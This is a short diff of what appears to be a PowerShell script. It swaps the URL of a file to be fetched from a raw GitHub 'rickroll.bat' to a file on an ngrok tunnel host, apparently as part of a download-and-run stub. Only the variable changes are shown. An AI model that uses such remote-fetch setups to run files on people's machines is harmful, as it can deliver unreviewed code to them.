@@ -1,5 +1,5 @@
-$ProcName = "bat.bat"
-$WebFile = "https://raw.githubusercontent.com/Dharkboi/rickroll.bat/main/$ProcName"
+$ProcName = "hello.txt"
+$WebFile = " http://89b6-8-20-101-109.ngrok.io/$ProcName"
  
 Clear-Host
  
